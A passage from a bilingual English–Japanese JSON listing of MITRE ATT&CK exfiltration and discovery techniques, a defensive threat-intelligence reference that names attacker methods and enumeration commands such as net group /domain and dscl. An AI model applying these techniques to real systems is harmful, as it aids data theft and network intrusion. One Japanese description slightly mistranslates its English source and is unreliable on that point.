                "description_jp": "攻撃者は、コマンドアンドコントロールチャネルとは異なるネットワーク媒体を介してデータを持ち出そうとする可能性があります。コマンドアンドコントロールネットワークが有線インターネット接続である場合、持ち出しは、例えば、WiFi接続、モデム、携帯電話データ接続、Bluetooth、または別の無線周波数（RF）チャネルを介して発生する可能性があります。\n\n攻撃者は、十分なアクセス権または近接性があり、接続がプライマリのインターネット接続チャネルほど安全または防御されておらず、同じエンタープライズネットワークを経由してルーティングされていない場合に、これを行うことを選択する可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1011.001",
                        "name_eng": "Exfiltration Over Bluetooth",
                        "name_jp": "Bluetooth経由の持ち出し",
                        "description_eng": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                        "description_jp": "攻撃者は、コマンドアンドコントロールチャネルではなく、Bluetooth経由でデータを持ち出そうとする可能性があります。コマンドアンドコントロールネットワークが有線インターネット接続である場合、攻撃者はBluetooth通信チャネルを使用してデータを持ち出すことを選択する可能性があります。\n\n攻撃者は、十分なアクセス権と近接性がある場合にこれを行うことを選択する可能性があります。Bluetooth接続は、同じエンタープライズネットワークを経由してルーティングされていないため、プライマリのインターネット接続チャネルほど安全または防御されていない可能性があります。"
                    }
                ]
            },
            {
                "id": "T1020",
                "name_eng": "Automated Exfiltration",
                "name_jp": "自動持ち出し",
                "description_eng": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.(Citation: ESET Gamaredon June 2020) \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
                "description_jp": "攻撃者は、収集中に収集された後、自動処理を使用して機密文書などのデータを持ち出す可能性があります。(引用: ESET Gamaredon June 2020)\n\n自動持ち出しが使用される場合、情報をネットワーク外に転送するために、[C2チャネル経由の持ち出し](https://attack.mitre.org/techniques/T1041)や[代替プロトコル経由の持ち出し](https://attack.mitre.org/techniques/T1048)など、他の持ち出しテクニックも同様に適用される可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1020.001",
                        "name_eng": "Traffic Duplication",
                        "name_jp": "トラフィック複製",
                        "description_eng": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                        "description_jp": "攻撃者は、侵害されたインフラストラクチャを介したデータの自動持ち出しを容易にするために、トラフィックミラーリングを利用する可能性があります。トラフィックミラーリングは一部のデバイスのネイティブ機能であり、ネットワーク分析によく使用されます。例えば、デバイスはネットワークアナライザやその他の監視デバイスによる分析のために、ネットワークトラフィックを1つ以上の宛先に転送するように構成される場合があります。(引用: Cisco Traffic Mirroring)(引用: Juniper Traffic Mirroring)\n\n攻撃者は、トラフィックミラーリングを悪用して、制御下にある他のインフラストラクチャを介してネットワークトラフィックをミラーリングまたはリダイレクトする可能性があります。トラフィックリダイレクトを可能にするためのネットワークデバイスへの悪意のある変更は、[ROMMONキット](https://attack.mitre.org/techniques/T1542/004)または[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を介して可能になる場合があります。(引用: US-CERT-TA18-106A)(引用: Cisco Blog Legacy Device Attacks)\n\n多くのクラウドベースの環境もトラフィックミラーリングをサポートしています。例えば、AWS Traffic Mirroring、GCP Packet Mirroring、Azure vTapにより、ユーザーはトラフィックを収集する特定のインスタンスと、収集されたトラフィックを送信する特定のターゲットを定義できます。(引用: AWS Traffic Mirroring)(引用: GCP Packet Mirroring)(引用: Azure Virtual Network TAP)\n\n攻撃者は、攻撃者の目標と目的に応じて、[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)、[入力キャプチャ](https://attack.mitre.org/techniques/T1056)、または[中間者攻撃](https://attack.mitre.org/techniques/T1557)と組み合わせてトラフィック複製を使用する場合があります。"
                    }
                ]
            },
            {
                "id": "T1041",
                "name_eng": "Exfiltration Over C2 Channel",
                "name_jp": "C2チャネル経由の持ち出し",
                "description_eng": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
                "description_jp": "攻撃者は、既存のコマンドアンドコントロールチャネルを介してデータを持ち出すことにより、データを盗む可能性があります。盗まれたデータは、コマンドアンドコントロール通信と同じプロトコルを使用して、通常の通信チャネルにエンコードされます。",
                "subtechniques": []
            },
            {
                "id": "T1048",
                "name_eng": "Exfiltration Over Alternative Protocol",
                "name_jp": "代替プロトコル経由の持ち出し",
                "description_eng": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).",
                "description_jp": "攻撃者は、既存のコマンドアンドコントロールチャネルとは異なるプロトコルを介してデータを持ち出すことにより、データを盗む可能性があります。データはまた、メインのコマンドアンドコントロールサーバーとは異なるネットワークの場所に送信される場合もあります。\n\n代替プロトコルには、FTP、SMTP、HTTP/S、DNS、SMB、またはメインのコマンドアンドコントロールチャネルとして使用されていないその他のネットワークプロトコルが含まれます。攻撃者はまた、これらの代替チャネルを暗号化および/または難読化することを選択する場合があります。\n\n[代替プロトコル経由のデータ持ち出し](https://attack.mitre.org/techniques/T1048)は、[Net](https://attack.mitre.org/software/S0039)/SMBやFTPなどのさまざまな一般的なオペレーティングシステムユーティリティを使用して実行できます。(引用: Palo Alto OilRig Oct 2016) macOSおよびLinuxでは、<code>curl</code>を使用して、HTTP/SやFTP/Sなどのプロトコルを呼び出し、システムからデータを持ち出すことができます。(引用: 20 macOS Common Tools and Techniques)\n\n多くのIaaSおよびSaaSプラットフォーム（Microsoft Exchange、Microsoft SharePoint、GitHub、AWS S3など）は、Webコンソールまたは[クラウドAPI](https://attack.mitre.org/techniques/T1059/009)を介したファイル、メール、ソースコード、およびその他の機密情報の直接ダウンロードをサポートしています。",
                "subtechniques": [
                    {
                        "id": "T1048.002",
                        "name_eng": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
                        "name_jp": "非対称暗号化非C2プロトコル経由の持ち出し",
                        "description_eng": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",
                        "description_jp": "攻撃者は、既存のコマンドアンドコントロールチャネルとは異なる、非対称暗号化されたネットワークプロトコルを介してデータを持ち出すことにより、データを盗む可能性があります。データはまた、メインのコマンドアンドコントロールサーバーとは異なるネットワークの場所に送信される場合もあります。\n\n非対称暗号化アルゴリズムは、チャネルの両端で異なるキーを使用するものです。公開鍵暗号方式としても知られており、これには対応するキーからデータを暗号化/復号化できる暗号鍵のペアが必要です。通信チャネルの各端は、秘密鍵（そのエンティティのみが所有）と他のエンティティの公開鍵を必要とします。各エンティティの公開鍵は、暗号化された通信が開始される前に交換されます。\n\n非対称暗号化を使用するネットワークプロトコル（HTTPS/TLS/SSLなど）は、キーが交換されると対称暗号化を利用することがよくあります。攻撃者は、プロトコルに組み込まれているメカニズムを使用する代わりに、これらの暗号化されたメカニズムを使用することを選択する場合があります。"
                    },
                    {
                        "id": "T1048.003",
                        "name_eng": "Exfiltration Over Unencrypted Non-C2 Protocol",
                        "name_jp": "非暗号化非C2プロトコル経由の持ち出し",
                        "description_eng": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
                        "description_jp": "攻撃者は、既存のコマンドアンドコントロールチャネルとは異なる、暗号化されていないネットワークプロトコルを介してデータを持ち出すことにより、データを盗む可能性があります。データはまた、メインのコマンドアンドコントロールサーバーとは異なるネットワークの場所に送信される場合もあります。(引用: copy_cmd_cisco)\n\n攻撃者は、ネイティブに暗号化されていないネットワークプロトコル（HTTP、FTP、DNSなど）内で、暗号化を使用せずにこのデータを難読化することを選択する場合があります。これには、カスタムまたは一般に入手可能なエンコーディング/圧縮アルゴリズム（base64など）や、プロトコルヘッダーおよびフィールド内へのデータの埋め込みが含まれる場合があります。"
                    },
                    {
                        "id": "T1048.001",
                        "name_eng": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
                        "name_jp": "対称暗号化非C2プロトコル経由の持ち出し",
                        "description_eng": "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).",
                        "description_jp": "攻撃者は、既存のコマンドアンドコントロールチャネルとは異なる、対称暗号化されたネットワークプロトコルを介してデータを持ち出すことにより、データを盗む可能性があります。データはまた、メインのコマンドアンドコントロールサーバーとは異なるネットワークの場所に送信される場合もあります。\n\n対称暗号化アルゴリズムは、チャネルの両端で共有または同じキー/シークレットを使用するものです。これには、データを暗号化および復号化するために使用される値の交換または事前の取り決め/所有が必要です。\n\n非対称暗号化を使用するネットワークプロトコルは、キーが交換されると対称暗号化を利用することがよくありますが、攻撃者は、プロトコルに組み込まれているメカニズムを使用する代わりに、キーを手動で共有し、対称暗号アルゴリズム（RC4、AESなど）を実装することを選択する場合があります。これにより、複数レイヤーの暗号化（HTTPSなどのネイティブに暗号化されたプロトコル）や、通常暗号化されていないプロトコル（HTTPやFTPなど）での暗号化が行われる可能性があります。"
                    }
                ]
            },
            {
                "id": "T1030",
                "name_eng": "Data Transfer Size Limits",
                "name_jp": "データ転送サイズ制限",
                "description_eng": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
                "description_jp": "攻撃者は、ファイル全体ではなく固定サイズのチャンクでデータを持ち出したり、パケットサイズを特定のしきい値未満に制限したりする場合があります。このアプローチは、ネットワークデータ転送のしきい値アラートをトリガーするのを回避するために使用される可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1537",
                "name_eng": "Transfer Data to Cloud Account",
                "name_jp": "クラウドアカウントへのデータ転送",
                "description_eng": "Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.(Citation: TLDRSec AWS Attacks)\n\nAdversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.(Citation: Microsoft Azure Storage Shared Access Signature)\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018)",
                "description_jp": "攻撃者は、クラウド環境の共有/同期やバックアップ作成を通じて、同じサービス上の自身が制御する別のクラウドアカウントにデータを転送することにより、データを持ち出す可能性があります。\n\n通常のファイル転送やコマンドアンドコントロールチャネルを介したクラウド環境外への大規模な転送を監視している防御側は、同じクラウドプロバイダー内の別のアカウントへのデータ転送を監視していない可能性があります。このような転送は、既存のクラウドプロバイダーAPIとクラウドプロバイダーの内部アドレス空間を利用して、通常のトラフィックに紛れ込ませたり、外部ネットワークインターフェイス経由のデータ転送を回避したりする場合があります。(引用: TLDRSec AWS Attacks)\n\n攻撃者はまた、匿名のファイル共有リンクを作成したり、Azureの場合は共有アクセス署名（SAS）URIを作成したりするなど、クラウドネイティブなメカニズムを使用して被害者のデータを攻撃者が制御するクラウドアカウントと共有する可能性があります。(引用: Microsoft Azure Storage Shared Access Signature)\n\n攻撃者がクラウドインスタンスのバックアップを作成し、それらを別のアカウントに転送したインシデントが観察されています。(引用: DOJ GRU Indictment Jul 2018)",
                "subtechniques": []
            },
            {
                "id": "T1052",
                "name_eng": "Exfiltration Over Physical Medium",
                "name_jp": "物理媒体経由の持ち出し",
                "description_eng": "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
                "description_jp": "攻撃者は、リムーバブルドライブなどの物理媒体を介してデータを持ち出そうとする可能性があります。エアギャップネットワークの侵害など、特定の状況では、ユーザーによって導入された物理媒体またはデバイスを介して持ち出しが発生する可能性があります。そのような媒体は、外付けハードドライブ、USBドライブ、携帯電話、MP3プレーヤー、またはその他のリムーバブルストレージおよび処理デバイスである可能性があります。物理媒体またはデバイスは、最終的な持ち出しポイントとして、または他の方法では切断されているシステム間をホップするために使用される可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1052.001",
                        "name_eng": "Exfiltration over USB",
                        "name_jp": "USB経由の持ち出し",
                        "description_eng": "Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
                        "description_jp": "攻撃者は、USB接続の物理デバイスを介してデータを持ち出そうとする可能性があります。エアギャップネットワークの侵害など、特定の状況では、ユーザーによって導入されたUSBデバイスを介して持ち出しが発生する可能性があります。USBデバイスは、最終的な持ち出しポイントとして、または他の方法では切断されているシステム間をホップするために使用される可能性があります。"
                    }
                ]
            }
        ]
    },
    {
        "id": "TA0007",
        "name_eng": "Discovery",
        "name_jp": "探索",
        "description_eng": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.",
        "description_jp": "攻撃者はあなたの環境を把握しようとしています。\n\nディスカバリーは、攻撃者がシステムおよび内部ネットワークに関する知識を得るために使用する可能性のあるテクニックで構成されます。これらのテクニックは、攻撃者が行動方法を決定する前に環境を観察し、状況を把握するのに役立ちます。また、現在の目的にどのように役立つかを発見するために、エントリーポイントの周囲で何を制御でき、何があるかを探ることもできます。ネイティブのオペレーティングシステムツールは、この侵害後の情報収集の目的でよく使用されます。",
        "techniques": [
            {
                "id": "T1033",
                "name_eng": "System Owner/User Discovery",
                "name_jp": "システム所有者/ユーザーの探索",
                "description_eng": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",
                "description_jp": "攻撃者は、主要ユーザー、現在ログインしているユーザー、システムを一般的に使用するユーザーのセット、またはユーザーがシステムをアクティブに使用しているかどうかを特定しようとする可能性があります。例えば、アカウントのユーザー名を取得したり、[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)を使用したりすることによってこれを行う可能性があります。ユーザーとユーザー名の詳細はシステム全体に存在し、実行中のプロセスの所有権、ファイル/ディレクトリの所有権、セッション情報、システムログが含まれるため、情報は他のディスカバリーテクニックを使用してさまざまな方法で収集される可能性があります。攻撃者は、自動検出中に[システム所有者/ユーザーディスカバリー](https://attack.mitre.org/techniques/T1033)からの情報を使用して、攻撃者がターゲットを完全に感染させるかどうか、および/または特定のアクションを試みるかどうかなど、その後の動作を形成する可能性があります。\n\n<code>whoami</code>など、さまざまなユーティリティやコマンドがこの情報を取得する可能性があります。macOSおよびLinuxでは、現在ログインしているユーザーは<code>w</code>および<code>who</code>で識別できます。macOSでは、<code>dscl . list /Users | grep -v '_'</code>コマンドを使用してユーザーアカウントを列挙することもできます。<code>%USERNAME%</code>や<code>$USER</code>などの環境変数も、この情報にアクセスするために使用される場合があります。\n\nネットワークデバイスでは、<code>show users</code>や<code>show ssh</code>などの[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンドを使用して、現在デバイスにログインしているユーザーを表示できます。(引用: show_ssh_users_cmd_cisco)(引用: US-CERT TA18-106A Network Infrastructure Devices 2018)",
                "subtechniques": []
            },
            {
                "id": "T1613",
                "name_eng": "Container and Resource Discovery",
                "name_jp": "コンテナとリソースの探索",
                "description_eng": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.",
                "description_jp": "攻撃者は、コンテナ環境内で利用可能なコンテナやその他のリソースを発見しようとする可能性があります。その他のリソースには、イメージ、デプロイメント、ポッド、ノード、およびクラスターのステータスなどのその他の情報が含まれる場合があります。\n\nこれらのリソースは、KubernetesダッシュボードなどのWebアプリケーション内で表示したり、DockerおよびKubernetes APIを介してクエリしたりできます。(引用: Docker API)(引用: Kubernetes API) Dockerでは、ログから環境の構成、利用可能なサービス、被害者が利用している可能性のあるクラウドプロバイダーなどの環境に関する情報が漏洩する可能性があります。これらのリソースの発見は、横方向の移動を実行する方法や実行に使用するメソッドなど、環境内での攻撃者の次のステップを通知する可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1069",
                "name_eng": "Permission Groups Discovery",
                "name_jp": "権限グループの探索",
                "description_eng": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\n\nAdversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018)",
                "description_jp": "攻撃者はグループと権限設定を発見しようとする可能性があります。この情報は、攻撃者が利用可能なユーザーアカウントとグループ、特定のグループのユーザーのメンバーシップ、および昇格された権限を持つユーザーとグループを特定するのに役立ちます。\n\n攻撃者は多くの異なる方法でグループ権限設定を発見しようとする可能性があります。このデータは、その後の活動やターゲティングで使用できる侵害された環境に関する情報を攻撃者に提供する可能性があります。(引用: CrowdStrike BloodHound April 2018)",
                "subtechniques": [
                    {
                        "id": "T1069.003",
                        "name_eng": "Cloud Groups",
                        "name_jp": "クラウドグループ",
                        "description_eng": "Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",
                        "description_jp": "攻撃者はクラウドグループと権限設定を見つけようとする可能性があります。クラウド権限グループの知識は、攻撃者が環境内のユーザーとグループの特定の役割、および特定のグループに関連付けられているユーザーを特定するのに役立ちます。\n\n認証済みアクセスがあれば、権限グループを見つけるために使用できるいくつかのツールがあります。<code>Get-MsolRole</code> PowerShellコマンドレットを使用して、ExchangeおよびOffice 365アカウントの役割と権限グループを取得できます。(引用: Microsoft Msolrole)(引用: GitHub Raindance)\n\nAzure CLI (AZ CLI) および Google Cloud Identity Provider API も、権限グループを取得するためのインターフェイスを提供します。コマンド <code>az ad user get-member-groups</code> は Azure のユーザーアカウントに関連付けられたグループをリストし、API エンドポイント <code>GET https://cloudidentity.googleapis.com/v1/groups</code> は Google のユーザーが利用可能なグループリソースをリストします。(引用: Microsoft AZ CLI)(引用: Black Hills Red Teaming MS AD Azure, 2018)(引用: Google Cloud Identity API Documentation) AWSでは、<code>ListRolePolicies</code>および<code>ListAttachedRolePolicies</code>コマンドにより、ユーザーはロールにアタッチされたポリシーを列挙できます。(引用: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\n敵対者は、オブジェクトの所有者やオブジェクトへのアクセス権を持つ他のアカウントを特定するために、例えばAWSの<code>GetBucketAcl</code> APIを介してオブジェクトのACLをリストしようとするかもしれない。(引用：AWS Get Bucket ACL) この情報を使用して、敵対者は特定のオブジェクトへのアクセス権を持つアカウントを標的にしたり、既に侵害したアカウントを利用してオブジェクトにアクセスしたりすることができる。"
                    },
                    {
                        "id": "T1069.002",
                        "name_eng": "Domain Groups",
                        "name_jp": "ドメイングループ",
                        "description_eng": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
                        "description_jp": "攻撃者はドメインレベルのグループと権限設定を見つけようとする可能性があります。ドメインレベルの権限グループの知識は、攻撃者がどのグループが存在し、どのユーザーが特定のグループに属しているかを特定するのに役立ちます。攻撃者はこの情報を使用して、ドメイン管理者など、昇格された権限を持つユーザーを特定する可能性があります。\n\n[Net](https://attack.mitre.org/software/S0039)ユーティリティの<code>net group /domain</code>、macOSの<code>dscacheutil -q group</code>、Linuxの<code>ldapsearch</code>などのコマンドで、ドメインレベルのグループを一覧表示できます。"
                    },
                    {
                        "id": "T1069.001",
                        "name_eng": "Local Groups",
                        "name_jp": "ローカルグループ",
                        "description_eng": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
                        "description_jp": "攻撃者はローカルシステムグループと権限設定を見つけようとする可能性があります。ローカルシステム権限グループの知識は、攻撃者がどのグループが存在し、どのユーザーが特定のグループに属しているかを特定するのに役立ちます。攻撃者はこの情報を使用して、ローカル管理者グループ内に見つかったユーザーなど、昇格された権限を持つユーザーを特定する可能性があります。\n\n[Net](https://attack.mitre.org/software/S0039)ユーティリティの<code>net localgroup</code>、macOSの<code>dscl . -list /Groups</code>、Linuxの<code>groups</code>などのコマンドでローカルグループを一覧表示できます。"
                    }
                ]
            },
            {
                "id": "T1615",
                "name_eng": "Group Policy Discovery",
                "name_jp": "グループポリシーの探索",
                "description_eng": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",
                "description_jp": "攻撃者は、権限昇格の経路、ドメイン内で適用されるセキュリティ対策を特定し、操作または環境に溶け込むために使用できるドメインオブジェクトのパターンを発見するために、グループポリシー設定に関する情報を収集する可能性があります。グループポリシーにより、Active Directory（AD）のユーザーとコンピューターの設定を一元管理できます。グループポリシーオブジェクト（GPO）は、予測可能なネットワークパス<code>\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\</code>内に保存されているファイルで構成されるグループポリシー設定のコンテナーです。(引用: TechNet Group Policy Basics)(引用: ADSecurity GPO Persistence 2016)\n\n攻撃者は、<code>gpresult</code>などのコマンドや、<code>Get-DomainGPO</code>や<code>Get-DomainGPOLocalGroup</code>などのさまざまな一般に入手可能なPowerShell関数を使用して、グループポリシー設定に関する情報を収集する可能性があります。(引用: Microsoft gpresult)(引用: Github PowerShell Empire) 攻撃者はこの情報を使用して、ターゲットネットワーク内の潜在的な攻撃パスや、利益のためにグループポリシー設定を操作する機会（つまり、[ドメインまたはテナントポリシーの変更](https://attack.mitre.org/techniques/T1484)）を決定するなど、その後の行動を形成する可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1652",
                "name_eng": "Device Driver Discovery",
                "name_jp": "デバイスドライバーの探索",
